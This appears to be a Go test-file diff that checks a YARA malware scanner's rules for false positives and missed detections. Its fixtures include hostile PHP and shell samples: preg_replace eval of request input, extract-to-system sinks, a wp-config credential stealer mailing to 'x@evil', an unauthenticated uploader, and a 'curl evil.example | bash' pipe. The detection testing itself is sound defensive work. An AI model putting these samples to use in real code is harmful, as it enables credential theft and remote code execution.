@@ -96,3 +96,104 @@ func TestFPFlood_WgetPipeAndBashrc_MarkdownDoc(t *testing.T) {
 		t.Error("backdoor_bashrc_injection regression: real rc backdoor not detected")
 	}
 }
+
+func TestFPFlood_PregReplaceEval_ReplacementOnly(t *testing.T) {
+	s := loadRepoYaraScanner(t)
+	legit := []byte("<?php preg_replace('/.*/e', 'strtoupper(\"$0\")', $_POST['subject']);")
+	if hasYaraRule(s.ScanBytes(legit), "obfuscation_preg_replace_eval") {
+		t.Error("obfuscation_preg_replace_eval FP: treated the third argument as executable replacement")
+	}
+
+	malicious := []byte("<?php preg_replace('/[\\\\\"\\\\\\']+/e', $_REQUEST['code'], $subject);")
+	if !hasYaraRule(s.ScanBytes(malicious), "obfuscation_preg_replace_eval") {
+		t.Error("obfuscation_preg_replace_eval regression: missed escaped quotes in the pattern")
+	}
+
+	concatenated := []byte("<?php preg_replace('/.*/e', 'prefix'.$_COOKIE['code'], $subject);")
+	if !hasYaraRule(s.ScanBytes(concatenated), "obfuscation_preg_replace_eval") {
+		t.Error("obfuscation_preg_replace_eval regression: missed request input concatenated into the replacement")
+	}
+}
+
+func TestFPFlood_ExtractGlobals_DoesNotCrossScope(t *testing.T) {
+	s := loadRepoYaraScanner(t)
+	for _, legit := range [][]byte{
+		[]byte("<?php function unpack_form(){ extract($_POST); switch($action){ case 'save': save_option($key,$value); } } function run_command(){ system($command); }"),
+		[]byte("<?php extract($_POST); function run_command(){ system($command); }"),
+	} {
+		if hasYaraRule(s.ScanBytes(legit), "obfuscation_extract_globals") {
+			t.Errorf("obfuscation_extract_globals FP: bridged into an unrelated function: %s", legit)
+		}
+	}
+
+	malicious := []byte("<?php extract($_POST); if ($ready) { system($command); }")
+	if !hasYaraRule(s.ScanBytes(malicious), "obfuscation_extract_globals") {
+		t.Error("obfuscation_extract_globals regression: missed a sink inside a local control block")
+	}
+}
+
+func TestFPFlood_WpConfigStealer_CorrelatesExfiltration(t *testing.T) {
+	s := loadRepoYaraScanner(t)
+	for _, backup := range [][]byte{
+		[]byte("<?php $c=file_get_contents($p.'/wp-config.php'); $c=str_replace('DB_PASSWORD',$new,$c); file_put_contents($restore,$c); $ch=curl_init($zip); curl_exec($ch);"),
+		[]byte("<?php $c=file_get_contents($p.'/wp-config.php'); $contents=file_get_contents($zip); curl_setopt($ch,CURLOPT_POSTFIELDS,$contents); curl_exec($ch);"),
+		[]byte("<?php $wp_config=file_get_contents($p.'/wp-config.php'); $wpconfig=file_get_contents($zip); curl_setopt($ch,CURLOPT_POSTFIELDS,$wpconfig); curl_exec($ch);"),
+		[]byte("<?php $conf=file_get_contents($p.'/wp-config.php'); preg_match(\"/DB_PASSWORD/\",$conf,$m); curl_exec($archive);"),
+	} {
+		if hasYaraRule(s.ScanBytes(backup), "exploit_wp_config_stealer") {
+			t.Errorf("exploit_wp_config_stealer FP: treated an unrelated archive upload as config exfiltration: %s", backup)
+		}
+	}
+
+	for _, stealer := range [][]byte{
+		[]byte("<?php echo file_get_contents('wp-config.php');"),
+		[]byte("<?php readfile($root.'/wp-config.php');"),
+		[]byte("<?php $conf=file_get_contents('../wp-config.php'); preg_match(\"/DB_PASSWORD.*'([^']+)'/\",$conf,$m); mail('x@evil','creds',$m[1]);"),
+	} {
+		if !hasYaraRule(s.ScanBytes(stealer), "exploit_wp_config_stealer") {
+			t.Errorf("exploit_wp_config_stealer regression: missed config exfiltration: %s", stealer)
+		}
+	}
+}
+
+func TestFPFlood_UploaderNoAuth_MailerProseDoesNotSuppress(t *testing.T) {
+	s := loadRepoYaraScanner(t)
+	for _, malicious := range [][]byte{
+		[]byte("<?php /* PHPMailer can use addAttachment here. */ move_uploaded_file($_FILES['f']['tmp_name'], './'.$_FILES['f']['name']);"),
+		[]byte("<?php /* mail($to, $subject, $body); */ move_uploaded_file($_FILES['f']['tmp_name'], './'.$_FILES['f']['name']);"),
+	} {
+		if !hasYaraRule(s.ScanBytes(malicious), "dropper_uploader_no_auth") {
+			t.Errorf("dropper_uploader_no_auth regression: mailer prose suppressed an unauthenticated uploader: %s", malicious)
+		}
+	}
+
+	legit := []byte("<?php if(move_uploaded_file($_FILES['f']['tmp_name'],$uploadfile)){ mail($to,'new upload',$uploadfile); }")
+	if hasYaraRule(s.ScanBytes(legit), "dropper_uploader_no_auth") {
+		t.Error("dropper_uploader_no_auth FP: matched an upload-and-email form")
+	}
+}
+
+func TestFPFlood_MarkdownProseDoesNotSuppressShellCommand(t *testing.T) {
+	s := loadRepoYaraScanner(t)
+	mdLink := []byte("[curl -sL https://example.test/install.sh | sh](https://example.test/install)")
+	for _, rule := range []string{"dropper_wget_pipe_exec", "backdoor_bashrc_injection"} {
+		if hasYaraRule(s.ScanBytes(mdLink), rule) {
+			t.Errorf("%s FP: matched a download command used as Markdown link text", rule)
+		}
+	}
+
+	malicious := []byte("#!/bin/bash\n# See [docs](https://example.test)\ncurl -s http://evil.example/x.sh | bash\n")
+	for _, rule := range []string{"dropper_wget_pipe_exec", "backdoor_bashrc_injection"} {
+		if !hasYaraRule(s.ScanBytes(malicious), rule) {
+			t.Errorf("%s regression: unrelated Markdown prose suppressed a shell command", rule)
+		}
+	}
+
+	fence := string([]byte{96, 96, 96})
+	mixed := []byte(fence + "\ncurl -s https://example.test/install.sh | sh\n" + fence + "\ncurl -s http://evil.example/x.sh | bash\n")
+	for _, rule := range []string{"dropper_wget_pipe_exec", "backdoor_bashrc_injection"} {
+		if !hasYaraRule(s.ScanBytes(mixed), rule) {
+			t.Errorf("%s regression: fenced documentation suppressed an unfenced shell command", rule)
+		}
+	}
+}
